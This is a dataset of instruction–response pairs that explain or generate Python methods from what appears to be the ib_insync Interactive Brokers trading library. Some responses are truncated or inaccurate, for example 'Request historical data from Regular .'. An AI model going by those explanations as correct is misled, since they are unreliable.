{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef cancelOrder(self, order: Order) -> Trade:\n        self.client.cancelOrder(order.orderId)\n        now = datetime.datetime.now(datetime.timezone.utc)\n        key = self.wrapper.orderKey(\n            order.clientId, order.orderId, order.permId)\n        trade = self.wrapper.trades.get(key)\n        if trade:\n            if not trade.isDone():\n                status = trade.orderStatus.status\n                if (status == OrderStatus.PendingSubmit and not order.transmit\n                        or status == OrderStatus.Inactive):\n                    newStatus = OrderStatus.Cancelled\n                else:\n                    newStatus = OrderStatus.PendingCancel\n                logEntry = TradeLogEntry(now, newStatus, '')\n                trade.log.append(logEntry)\n                trade.orderStatus.status = newStatus\n                self._logger.info(f'cancelOrder: {trade}')\n                trade.cancelEvent.emit(trade)\n                trade.statusEvent.emit(trade)\n                self.cancelOrderEvent.emit(trade)\n                self.orderStatusEvent.emit(trade)\n                if newStatus == OrderStatus.Cancelled:\n                    trade.cancelledEvent.emit(trade)\n        else:\n            self._logger.error(f'cancelOrder: Unknown orderId {order.orderId}')\n        return trade", "response": "Cancels the order and returns the Trade it belongs to."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nrequest multiple account values of multiple accounts and keep updated.", "response": "def reqAccountUpdatesMulti(\n            self, account: str = '', modelCode: str = ''):\n        \"\"\"\n        It is recommended to use :meth:`.accountValues` instead.\n\n        Request account values of multiple accounts and keep updated.\n\n        This method is blocking.\n\n        Args:\n            account: If specified, filter for this account name.\n            modelCode: If specified, filter for this account model.\n        \"\"\"\n        self._run(self.reqAccountUpdatesMultiAsync(account, modelCode))"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef reqExecutions(\n            self, execFilter: ExecutionFilter = None) -> List[Fill]:\n        \"\"\"\n        It is recommended to use :meth:`.fills`  or\n        :meth:`.executions` instead.\n\n        Request and return a list a list of fills.\n\n        This method is blocking.\n\n        Args:\n            execFilter: If specified, return executions that match the filter.\n        \"\"\"\n        return self._run(self.reqExecutionsAsync(execFilter))", "response": "Request all executions of the specified object."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef reqPnL(self, account: str, modelCode: str = '') -> PnL:\n        key = (account, modelCode)\n        assert key not in self.wrapper.pnlKey2ReqId\n        reqId = self.client.getReqId()\n        self.wrapper.pnlKey2ReqId[key] = reqId\n        pnl = PnL(account, modelCode)\n        self.wrapper.pnls[reqId] = pnl\n        self.client.reqPnL(reqId, account, modelCode)\n        return pnl", "response": "Subscribe to this account and modelCode and return a new PnL object that is kept live updated."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef cancelPnL(self, account, modelCode: str = ''):\n        key = (account, modelCode)\n        reqId = self.wrapper.pnlKey2ReqId.pop(key, None)\n        if reqId:\n            self.client.cancelPnL(reqId)\n            self.wrapper.pnls.pop(reqId, None)\n        else:\n            self._logger.error(\n                'cancelPnL: No subscription for '\n                f'account {account}, modelCode {modelCode}')", "response": "Cancel PnL subscription for the specified account and model code."}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nsubscribes to this account modelCode and contract ID and request a profit and loss event for single positions.", "response": "def reqPnLSingle(\n            self, account: str, modelCode: str, conId: int) -> PnLSingle:\n        \"\"\"\n        Start a subscription for profit and loss events for single positions.\n\n        Returns a :class:`.PnLSingle` object that is kept live updated.\n        The result can also be queried from :meth:`.pnlSingle`.\n\n        https://interactivebrokers.github.io/tws-api/pnl.html\n\n        Args:\n            account: Subscribe to this account.\n            modelCode: Filter for this account model.\n            conId: Filter for this contract ID.\n        \"\"\"\n        key = (account, modelCode, conId)\n        assert key not in self.wrapper.pnlSingleKey2ReqId\n        reqId = self.client.getReqId()\n        self.wrapper.pnlSingleKey2ReqId[key] = reqId\n        pnlSingle = PnLSingle(account, modelCode, conId)\n        self.wrapper.pnlSingles[reqId] = pnlSingle\n        self.client.reqPnLSingle(reqId, account, modelCode, conId)\n        return pnlSingle"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef cancelPnLSingle(\n            self, account: str, modelCode: str, conId: int):\n        \"\"\"\n        Cancel PnLSingle subscription for the given account, modelCode\n        and conId.\n\n        Args:\n            account: Cancel for this account name.\n            modelCode: Cancel for this account model.\n            conId: Cancel for this contract ID.\n        \"\"\"\n        key = (account, modelCode, conId)\n        reqId = self.wrapper.pnlSingleKey2ReqId.pop(key, None)\n        if reqId:\n            self.client.cancelPnLSingle(reqId)\n            self.wrapper.pnlSingles.pop(reqId, None)\n        else:\n            self._logger.error(\n                'cancelPnLSingle: No subscription for '\n                f'account {account}, modelCode {modelCode}, conId {conId}')", "response": "Cancel a PnLSingle subscription for the given account modelCode and conId."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef reqContractDetails(self, contract: Contract) -> List[ContractDetails]:\n        return self._run(self.reqContractDetailsAsync(contract))", "response": "Get a list of contract details that match the given contract."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef reqMatchingSymbols(self, pattern: str) -> List[ContractDescription]:\n        return self._run(self.reqMatchingSymbolsAsync(pattern))", "response": "Request contracts that match a pattern."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nrequesting price increments rule.", "response": "def reqMarketRule(self, marketRuleId: int) -> PriceIncrement:\n        \"\"\"\n        Request price increments rule.\n\n        https://interactivebrokers.github.io/tws-api/minimum_increment.html\n\n        Args:\n            marketRuleId: ID of market rule.\n                The market rule IDs for a contract can be obtained\n                via :meth:`.reqContractDetails` from\n                :class:`.ContractDetails`.marketRuleIds,\n                which contains a comma separated string of market rule IDs.\n        \"\"\"\n        return self._run(self.reqMarketRuleAsync(marketRuleId))"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef reqRealTimeBars(\n            self, contract: Contract, barSize: int,\n            whatToShow: str, useRTH: bool,\n            realTimeBarsOptions: List[TagValue] = None) -> RealTimeBarList:\n        \"\"\"\n        Request realtime 5 second bars.\n\n        https://interactivebrokers.github.io/tws-api/realtime_bars.html\n\n        Args:\n            contract: Contract of interest.\n            barSize: Must be 5.\n            whatToShow: Specifies the source for constructing bars.\n                Can be 'TRADES', 'MIDPOINT', 'BID' or 'ASK'.\n            useRTH: If True then only show data from within Regular\n                Trading Hours, if False then show all data.\n            realTimeBarsOptions: Unknown.\n        \"\"\"\n        reqId = self.client.getReqId()\n        bars = RealTimeBarList()\n        bars.reqId = reqId\n        bars.contract = contract\n        bars.barSize = barSize\n        bars.whatToShow = whatToShow\n        bars.useRTH = useRTH\n        bars.realTimeBarsOptions = realTimeBarsOptions\n        self.wrapper.startSubscription(reqId, bars, contract)\n        self.client.reqRealTimeBars(\n            reqId, contract, barSize, whatToShow, useRTH, realTimeBarsOptions)\n        return bars", "response": "Request realtime 5 second bars."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef cancelRealTimeBars(self, bars: RealTimeBarList):\n        self.client.cancelRealTimeBars(bars.reqId)\n        self.wrapper.endSubscription(bars)", "response": "Cancels the realtime bars subscription."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef reqHistoricalData(\n            self, contract: Contract, endDateTime: object,\n            durationStr: str, barSizeSetting: str,\n            whatToShow: str, useRTH: bool,\n            formatDate: int = 1, keepUpToDate: bool = False,\n            chartOptions: List[TagValue] = None) -> BarDataList:\n        \"\"\"\n        Request historical bar data.\n\n        This method is blocking.\n\n        https://interactivebrokers.github.io/tws-api/historical_bars.html\n\n        Args:\n            contract: Contract of interest.\n            endDateTime: Can be set to '' to indicate the current time,\n                or it can be given as a datetime.date or datetime.datetime,\n                or it can be given as a string in 'yyyyMMdd HH:mm:ss' format.\n                If no timezone is given then the TWS login timezone is used.\n            durationStr: Time span of all the bars. Examples:\n                '60 S', '30 D', '13 W', '6 M', '10 Y'.\n            barSizeSetting: Time period of one bar. Must be one of:\n                '1 secs', '5 secs', '10 secs' 15 secs', '30 secs',\n                '1 min', '2 mins', '3 mins', '5 mins', '10 mins', '15 mins',\n                '20 mins', '30 mins',\n                '1 hour', '2 hours', '3 hours', '4 hours', '8 hours',\n                '1 day', '1 week', '1 month'.\n            whatToShow: Specifies the source for constructing bars.\n                Must be one of:\n                'TRADES', 'MIDPOINT', 'BID', 'ASK', 'BID_ASK',\n                'ADJUSTED_LAST', 'HISTORICAL_VOLATILITY',\n                'OPTION_IMPLIED_VOLATILITY', 'REBATE_RATE', 'FEE_RATE',\n                'YIELD_BID', 'YIELD_ASK', 'YIELD_BID_ASK', 'YIELD_LAST'.\n            useRTH: If True then only show data from within Regular\n                Trading Hours, if False then show all data.\n            formatDate: For an intraday request setting to 2 will cause\n                the returned date fields to be timezone-aware\n                datetime.datetime with UTC timezone, instead of local timezone\n                as used by TWS.\n            keepUpToDate: If True then a realtime subscription is started\n                to keep the bars updated; ``endDateTime`` must be set\n                empty ('') then.\n            chartOptions: Unknown.\n        \"\"\"\n        return self._run(\n            self.reqHistoricalDataAsync(\n                contract, endDateTime, durationStr, barSizeSetting, whatToShow,\n                useRTH, formatDate, keepUpToDate, chartOptions))", "response": "Request historical data from Regular\n               ."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\ncancels the update subscription for the historical bars.", "response": "def cancelHistoricalData(self, bars: BarDataList):\n        \"\"\"\n        Cancel the update subscription for the historical bars.\n\n        Args:\n            bars: The bar list that was obtained from ``reqHistoricalData``\n                with a keepUpToDate subscription.\n\n        \"\"\"\n        self.client.cancelHistoricalData(bars.reqId)\n        self.wrapper.endSubscription(bars)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nrequesting historical ticks from Regular .", "response": "def reqHistoricalTicks(\n            self, contract: Contract,\n            startDateTime: Union[str, datetime.date],\n            endDateTime: Union[str, datetime.date],\n            numberOfTicks: int, whatToShow: str, useRth: bool,\n            ignoreSize: bool = False,\n            miscOptions: List[TagValue] = None) -> List:\n        \"\"\"\n        Request historical ticks. The time resolution of the ticks\n        is one second.\n\n        This method is blocking.\n\n        https://interactivebrokers.github.io/tws-api/historical_time_and_sales.html\n\n        Args:\n            contract: Contract to query.\n            startDateTime: Can be given as a datetime.date or\n                datetime.datetime, or it can be given as a string in\n                'yyyyMMdd HH:mm:ss' format.\n                If no timezone is given then the TWS login timezone is used.\n            endDateTime: One of ``startDateTime`` or ``endDateTime`` can\n                be given, the other must be blank.\n            numberOfTicks: Number of ticks to request (1000 max). The actual\n                result can contain a bit more to accommodate all ticks in\n                the latest second.\n            whatToShow: One of 'Bid_Ask', 'Midpoint' or 'Trades'.\n            useRTH: If True then only show data from within Regular\n                Trading Hours, if False then show all data.\n            ignoreSize: Ignore bid/ask ticks that only update the size.\n            miscOptions: Unknown.\n        \"\"\"\n        return self._run(\n            self.reqHistoricalTicksAsync(\n                contract, startDateTime, endDateTime, numberOfTicks,\n                whatToShow, useRth, ignoreSize, miscOptions))"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef reqHeadTimeStamp(\n            self, contract: Contract, whatToShow: str,\n            useRTH: bool, formatDate: int = 1) -> datetime.datetime:\n        \"\"\"\n        Get the datetime of earliest available historical data\n        for the contract.\n\n        Args:\n            contract: Contract of interest.\n            useRTH: If True then only show data from within Regular\n                Trading Hours, if False then show all data.\n            formatDate: If set to 2 then the result is returned as a\n                timezone-aware datetime.datetime with UTC timezone.\n        \"\"\"\n        return self._run(\n            self.reqHeadTimeStampAsync(\n                contract, whatToShow, useRTH, formatDate))", "response": "Get the datetime of earliest available historical data for the contract."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nsubscribe to tick data or request a snapshot.", "response": "def reqMktData(\n            self, contract: Contract, genericTickList: str = '',\n            snapshot: bool = False, regulatorySnapshot: bool = False,\n            mktDataOptions: List[TagValue] = None) -> Ticker:\n        \"\"\"\n        Subscribe to tick data or request a snapshot.\n        Returns the Ticker that holds the market data. The ticker will\n        initially be empty and gradually (after a couple of seconds)\n        be filled.\n\n        https://interactivebrokers.github.io/tws-api/md_request.html\n\n        Args:\n            contract: Contract of interest.\n            genericTickList: Comma separated IDs of desired\n                generic ticks that will cause corresponding Ticker fields\n                to be filled:\n\n                =====  ================================================\n                ID     Ticker fields\n                =====  ================================================\n                100    ``putVolume``, ``callVolume`` (for options)\n                101    ``putOpenInterest``, ``callOpenInterest`` (for options)\n                104    ``histVolatility`` (for options)\n                105    ``avOptionVolume`` (for options)\n                106    ``impliedVolatility`` (for options)\n                162    ``indexFuturePremium``\n                165    ``low13week``, ``high13week``, ``low26week``,\n                       ``high26week``, ``low52week``, ``high52week``,\n                       ``avVolume``\n                221    ``markPrice``\n                233    ``last``, ``lastSize``, ``rtVolume``, ``vwap``\n                       (Time & Sales)\n                236    ``shortableShares``\n                258    ``fundamentalRatios`` (of type\n                       :class:`ib_insync.objects.FundamentalRatios`)\n                293    ``tradeCount``\n                294    ``tradeRate``\n                295    ``volumeRate``\n                411    ``rtHistVolatility``\n                456    ``dividends`` (of type\n                       :class:`ib_insync.objects.Dividends`)\n                588    ``futuresOpenInterest``\n                =====  ================================================\n\n            snapshot: If True then request a one-time snapshot, otherwise\n                subscribe to a stream of realtime tick data.\n            regulatorySnapshot: Request NBBO snapshot (may incur a fee).\n            mktDataOptions: Unknown\n        \"\"\"\n        reqId = self.client.getReqId()\n        ticker = self.wrapper.startTicker(reqId, contract, 'mktData')\n        self.client.reqMktData(\n            reqId, contract, genericTickList, snapshot,\n            regulatorySnapshot, mktDataOptions)\n        return ticker"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef reqTickByTickData(\n            self, contract: Contract, tickType: str,\n            numberOfTicks: int = 0, ignoreSize: bool = False) -> Ticker:\n        \"\"\"\n        Subscribe to tick-by-tick data and return the Ticker that\n        holds the ticks in ticker.tickByTicks.\n\n        https://interactivebrokers.github.io/tws-api/tick_data.html\n\n        Args:\n            contract: Contract of interest.\n            tickType: One of  'Last', 'AllLast', 'BidAsk' or 'MidPoint'.\n            numberOfTicks: Number of ticks or 0 for unlimited.\n            ignoreSize: Ignore bid/ask ticks that only update the size.\n        \"\"\"\n        reqId = self.client.getReqId()\n        ticker = self.wrapper.startTicker(reqId, contract, tickType)\n        self.client.reqTickByTickData(\n            reqId, contract, tickType, numberOfTicks, ignoreSize)\n        return ticker", "response": "Subscribe to tick - by - tick data and return the Ticker that holds the ticks in ticker. tickByTicks."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef cancelTickByTickData(self, contract: Contract, tickType: str):\n        ticker = self.ticker(contract)\n        reqId = self.wrapper.endTicker(ticker, tickType)\n        if reqId:\n            self.client.cancelTickByTickData(reqId)\n        else:\n            self._logger.error(\n                f'cancelMktData: No reqId found for contract {contract}')", "response": "Unsubscribe from tick - by - tick data"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef reqMktDepth(\n            self, contract: Contract, numRows: int = 5,\n            isSmartDepth: bool = False, mktDepthOptions=None) -> Ticker:\n        \"\"\"\n        Subscribe to market depth data (a.k.a. DOM, L2 or order book).\n\n        https://interactivebrokers.github.io/tws-api/market_depth.html\n\n        Args:\n            contract: Contract of interest.\n            numRows: Number of depth level on each side of the order book\n                (5 max).\n            isSmartDepth: Consolidate the order book across exchanges.\n            mktDepthOptions: Unknown.\n\n        Returns:\n            The Ticker that holds the market depth in ``ticker.domBids``\n            and ``ticker.domAsks`` and the list of MktDepthData in\n            ``ticker.domTicks``.\n        \"\"\"\n        reqId = self.client.getReqId()\n        ticker = self.wrapper.startTicker(reqId, contract, 'mktDepth')\n        self.client.reqMktDepth(\n            reqId, contract, numRows, isSmartDepth, mktDepthOptions)\n        return ticker", "response": "Subscribe to market depth data."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef cancelMktDepth(self, contract: Contract, isSmartDepth=False):\n        ticker = self.ticker(contract)\n        reqId = self.wrapper.endTicker(ticker, 'mktDepth')\n        if reqId:\n            self.client.cancelMktDepth(reqId, isSmartDepth)\n        else:\n            self._logger.error(\n                f'cancelMktDepth: No reqId found for contract {contract}')", "response": "Cancels market depth data."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef reqHistogramData(\n            self, contract: Contract,\n            useRTH: bool, period: str) -> List[HistogramData]:\n        \"\"\"\n        Request histogram data.\n\n        This method is blocking.\n\n        https://interactivebrokers.github.io/tws-api/histograms.html\n\n        Args:\n            contract: Contract to query.\n            useRTH: If True then only show data from within Regular\n                Trading Hours, if False then show all data.\n            period: Period of which data is being requested, for example\n                '3 days'.\n        \"\"\"\n        return self._run(\n            self.reqHistogramDataAsync(contract, useRTH, period))", "response": "Request histogram data.\n\n        This method is blocking.\n\n        https://interactivebrokers.github.io/tws-api/histograms.html\n\n        Args:\n            contract: Contract to query.\n            useRTH: If True then only show data from within Regular\n                Trading Hours, if False then show all data.\n            period: Period of which data is being requested, for example\n                '3 days'."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nrequesting fundamental data of a specific object.", "response": "def reqFundamentalData(\n            self, contract: Contract, reportType: str,\n            fundamentalDataOptions: List[TagValue] = None) -> str:\n        \"\"\"\n        Get fundamental data of a contract in XML format.\n\n        This method is blocking.\n\n        https://interactivebrokers.github.io/tws-api/fundamentals.html\n\n        Args:\n            contract: Contract to query.\n            reportType:\n\n                * 'ReportsFinSummary': Financial summary\n                * 'ReportsOwnership': Company's ownership\n                * 'ReportSnapshot': Company's financial overview\n                * 'ReportsFinStatements': Financial Statements\n                * 'RESC': Analyst Estimates\n                * 'CalendarReport': Company's calendar\n            fundamentalDataOptions: Unknown\n        \"\"\"\n        return self._run(\n            self.reqFundamentalDataAsync(\n                contract, reportType, fundamentalDataOptions))"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef reqScannerData(\n            self, subscription: ScannerSubscription,\n            scannerSubscriptionOptions: List[TagValue] = None,\n            scannerSubscriptionFilterOptions:\n            List[TagValue] = None) -> ScanDataList:\n        \"\"\"\n        Do a blocking market scan by starting a subscription and canceling it\n        after the initial list of results are in.\n\n        This method is blocking.\n\n        https://interactivebrokers.github.io/tws-api/market_scanners.html\n\n        Args:\n            subscription: Basic filters.\n            scannerSubscriptionOptions: Unknown.\n            scannerSubscriptionFilterOptions: Advanced generic filters.\n        \"\"\"\n        return self._run(\n            self.reqScannerDataAsync(\n                subscription, scannerSubscriptionOptions,\n                scannerSubscriptionFilterOptions))", "response": "Request the list of results from a scan."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef reqScannerSubscription(\n            self, subscription: ScannerSubscription,\n            scannerSubscriptionOptions: List[TagValue] = None,\n            scannerSubscriptionFilterOptions:\n            List[TagValue] = None) -> ScanDataList:\n        \"\"\"\n        Subscribe to market scan data.\n\n        https://interactivebrokers.github.io/tws-api/market_scanners.html\n\n        Args:\n            subscription: What to scan for.\n            scannerSubscriptionOptions: Unknown.\n            scannerSubscriptionFilterOptions: Unknown.\n        \"\"\"\n        reqId = self.client.getReqId()\n        dataList = ScanDataList()\n        dataList.reqId = reqId\n        dataList.subscription = subscription\n        dataList.scannerSubscriptionOptions = scannerSubscriptionOptions\n        dataList.scannerSubscriptionFilterOptions = \\\n            scannerSubscriptionFilterOptions\n        self.wrapper.startSubscription(reqId, dataList)\n        self.client.reqScannerSubscription(\n            reqId, subscription, scannerSubscriptionOptions,\n            scannerSubscriptionFilterOptions)\n        return dataList", "response": "Subscribe to market scan data."}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\ncanceling market data subscription.", "response": "def cancelScannerSubscription(self, dataList: ScanDataList):\n        \"\"\"\n        Cancel market data subscription.\n\n        https://interactivebrokers.github.io/tws-api/market_scanners.html\n\n        Args:\n            dataList: The scan data list that was obtained from\n                :meth:`.reqScannerSubscription`.\n        \"\"\"\n        self.client.cancelScannerSubscription(dataList.reqId)\n        self.wrapper.endSubscription(dataList)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\ncalculate the volatility given the option price and underlier price.", "response": "def calculateImpliedVolatility(\n            self, contract: Contract,\n            optionPrice: float, underPrice: float,\n            implVolOptions: List[TagValue] = None) -> OptionComputation:\n        \"\"\"\n        Calculate the volatility given the option price.\n\n        This method is blocking.\n\n        https://interactivebrokers.github.io/tws-api/option_computations.html\n\n        Args:\n            contract: Option contract.\n            optionPrice: Option price to use in calculation.\n            underPrice: Price of the underlier to use in calculation\n            implVolOptions: Unknown\n        \"\"\"\n        return self._run(\n            self.calculateImpliedVolatilityAsync(\n                contract, optionPrice, underPrice, implVolOptions))"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\ncalculates the option price given the volatility.", "response": "def calculateOptionPrice(\n            self, contract: Contract,\n            volatility: float, underPrice: float,\n            optPrcOptions=None) -> OptionComputation:\n        \"\"\"\n        Calculate the option price given the volatility.\n\n        This method is blocking.\n\n        https://interactivebrokers.github.io/tws-api/option_computations.html\n\n        Args:\n            contract: Option contract.\n            volatility: Option volatility to use in calculation.\n            underPrice: Price of the underlier to use in calculation\n            implVolOptions: Unknown\n        \"\"\"\n        return self._run(\n            self.calculateOptionPriceAsync(\n                contract, volatility, underPrice, optPrcOptions))"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nrequests the option chain parameters for the underlying security.", "response": "def reqSecDefOptParams(\n            self, underlyingSymbol: str,\n            futFopExchange: str, underlyingSecType: str,\n            underlyingConId: int) -> List[OptionChain]:\n        \"\"\"\n        Get the option chain.\n\n        This method is blocking.\n\n        https://interactivebrokers.github.io/tws-api/options.html\n\n        Args:\n            underlyingSymbol: Symbol of underlier contract.\n            futFopExchange: Exchange (only for ``FuturesOption``, otherwise\n                leave blank).\n            underlyingSecType: The type of the underlying security, like\n                'STK' or 'FUT'.\n            underlyingConId: conId of the underlying contract.\n        \"\"\"\n        return self._run(\n            self.reqSecDefOptParamsAsync(\n                underlyingSymbol, futFopExchange,\n                underlyingSecType, underlyingConId))"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nexercises an options contract.", "response": "def exerciseOptions(\n            self, contract: Contract, exerciseAction: int,\n            exerciseQuantity: int, account: str, override: int):\n        \"\"\"\n        Exercise an options contract.\n\n        https://interactivebrokers.github.io/tws-api/options.html\n\n        Args:\n            contract: The option contract to be exercised.\n            exerciseAction:\n                * 1 = exercise the option\n                * 2 = let the option lapse\n            exerciseQuantity: Number of contracts to be exercised.\n            account: Destination account.\n            override:\n                * 0 = no override\n                * 1 = override the system's natural action\n        \"\"\"\n        reqId = self.client.getReqId()\n        self.client.exerciseOptions(\n            reqId, contract, exerciseAction, exerciseQuantity,\n            account, override)"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef reqNewsArticle(\n            self, providerCode: str, articleId: str,\n            newsArticleOptions: List[TagValue] = None) -> NewsArticle:\n        \"\"\"\n        Get the body of a news article.\n\n        This method is blocking.\n\n        https://interactivebrokers.github.io/tws-api/news.html\n\n        Args:\n            providerCode: Code indicating news provider, like 'BZ' or 'FLY'.\n            articleId: ID of the specific article.\n            newsArticleOptions: Unknown.\n        \"\"\"\n        return self._run(\n            self.reqNewsArticleAsync(\n                providerCode, articleId, newsArticleOptions))", "response": "Request a specific news article."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef reqHistoricalNews(\n            self, conId: int, providerCodes: str,\n            startDateTime: Union[str, datetime.date],\n            endDateTime: Union[str, datetime.date],\n            totalResults: int,\n            historicalNewsOptions: List[TagValue] = None) -> HistoricalNews:\n        \"\"\"\n        Get historical news headline.\n\n        https://interactivebrokers.github.io/tws-api/news.html\n\n        This method is blocking.\n\n        Args:\n            conId: Search news articles for contract with this conId.\n            providerCodes: A '+'-separated list of provider codes, like\n                'BZ+FLY'.\n            startDateTime: The (exclusive) start of the date range.\n                Can be given as a datetime.date or datetime.datetime,\n                or it can be given as a string in 'yyyyMMdd HH:mm:ss' format.\n                If no timezone is given then the TWS login timezone is used.\n            endDateTime: The (inclusive) end of the date range.\n                Can be given as a datetime.date or datetime.datetime,\n                or it can be given as a string in 'yyyyMMdd HH:mm:ss' format.\n                If no timezone is given then the TWS login timezone is used.\n            totalResults: Maximum number of headlines to fetch (300 max).\n            historicalNewsOptions: Unknown.\n        \"\"\"\n        return self._run(\n            self.reqHistoricalNewsAsync(\n                conId, providerCodes, startDateTime, endDateTime,\n                totalResults, historicalNewsOptions))", "response": "Request historical news for a given contract with this conId."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef replaceFA(self, faDataType: int, xml: str):\n        self.client.replaceFA(faDataType, xml)", "response": "Replaces Financial Advisor s settings."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef df(objs, labels=None):\n    import pandas as pd\n    from .objects import Object, DynamicObject\n    if objs:\n        objs = list(objs)\n        obj = objs[0]\n        if isinstance(obj, Object):\n            df = pd.DataFrame.from_records(o.tuple() for o in objs)\n            df.columns = obj.__class__.defaults\n        elif isinstance(obj, DynamicObject):\n            df = pd.DataFrame.from_records(o.__dict__ for o in objs)\n        else:\n            df = pd.DataFrame.from_records(objs)\n        if isinstance(obj, tuple) and hasattr(obj, '_fields'):\n            # assume it's a namedtuple\n            df.columns = obj.__class__._fields\n    else:\n        df = None\n    if labels:\n        exclude = [label for label in df if label not in labels]\n        df = df.drop(exclude, axis=1)\n    return df", "response": "Create pandas DataFrame from a sequence of same - type objects."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef tree(obj):\n    from .objects import Object\n    if isinstance(obj, (bool, int, float, str, bytes)):\n        return obj\n    elif isinstance(obj, (datetime.date, datetime.time)):\n        return obj.isoformat()\n    elif isinstance(obj, dict):\n        return {k: tree(v) for k, v in obj.items()}\n    elif isinstance(obj, (list, tuple, set)):\n        return [tree(i) for i in obj]\n    elif isinstance(obj, Object):\n        return {obj.__class__.__qualname__: tree(obj.nonDefaults())}\n    else:\n        return str(obj)", "response": "Convert object to a tree of lists dicts and simple values."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef barplot(bars, title='', upColor='blue', downColor='red'):\n    import pandas as pd\n    import matplotlib.pyplot as plt\n    from matplotlib.lines import Line2D\n    from matplotlib.patches import Rectangle\n\n    if isinstance(bars, pd.DataFrame):\n        ohlcTups = [\n            tuple(v) for v in bars[['open', 'high', 'low', 'close']].values]\n    elif bars and hasattr(bars[0], 'open_'):\n        ohlcTups = [(b.open_, b.high, b.low, b.close) for b in bars]\n    else:\n        ohlcTups = [(b.open, b.high, b.low, b.close) for b in bars]\n\n    fig, ax = plt.subplots()\n    ax.set_title(title)\n    ax.grid(True)\n    fig.set_size_inches(10, 6)\n    for n, (open_, high, low, close) in enumerate(ohlcTups):\n        if close >= open_:\n            color = upColor\n            bodyHi, bodyLo = close, open_\n        else:\n            color = downColor\n            bodyHi, bodyLo = open_, close\n        line = Line2D(\n            xdata=(n, n),\n            ydata=(low, bodyLo),\n            color=color,\n            linewidth=1)\n        ax.add_line(line)\n        line = Line2D(\n            xdata=(n, n),\n            ydata=(high, bodyHi),\n            color=color,\n            linewidth=1)\n        ax.add_line(line)\n        rect = Rectangle(\n            xy=(n - 0.3, bodyLo),\n            width=0.6,\n            height=bodyHi - bodyLo,\n            edgecolor=color,\n            facecolor=color,\n            alpha=0.4,\n            antialiased=True\n        )\n        ax.add_patch(rect)\n\n    ax.autoscale_view()\n    return fig", "response": "Create candlestick plot for the given bars."}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\ncreating a log handler that logs to the given file.", "response": "def logToFile(path, level=logging.INFO):\n    \"\"\"\n    Create a log handler that logs to the given file.\n    \"\"\"\n    logger = logging.getLogger()\n    logger.setLevel(level)\n    formatter = logging.Formatter(\n        '%(asctime)s %(name)s %(levelname)s %(message)s')\n    handler = logging.FileHandler(path)\n    handler.setFormatter(formatter)\n    logger.addHandler(handler)"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\ncreates a log handler that logs to the console.", "response": "def logToConsole(level=logging.INFO):\n    \"\"\"\n    Create a log handler that logs to the console.\n    \"\"\"\n    logger = logging.getLogger()\n    logger.setLevel(level)\n    formatter = logging.Formatter(\n        '%(asctime)s %(name)s %(levelname)s %(message)s')\n    handler = logging.StreamHandler()\n    handler.setFormatter(formatter)\n    logger.handlers = [\n        h for h in logger.handlers\n        if type(h) is not logging.StreamHandler]\n    logger.addHandler(handler)"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nformatting the integer or float n to 3 significant digits + SI prefix.", "response": "def formatSI(n) -> str:\n    \"\"\"\n    Format the integer or float n to 3 significant digits + SI prefix.\n    \"\"\"\n    s = ''\n    if n < 0:\n        n = -n\n        s += '-'\n    if type(n) is int and n < 1000:\n        s = str(n) + ' '\n    elif n < 1e-22:\n        s = '0.00 '\n    else:\n        assert n < 9.99e26\n        log = int(math.floor(math.log10(n)))\n        i, j = divmod(log, 3)\n        for _try in range(2):\n            templ = '%.{}f'.format(2 - j)\n            val = templ % (n * 10 ** (-3 * i))\n            if val != '1000':\n                break\n            i += 1\n            j = 0\n        s += val + ' '\n        if i != 0:\n            s += 'yzafpnum kMGTPEZY'[i + 8]\n    return s"}
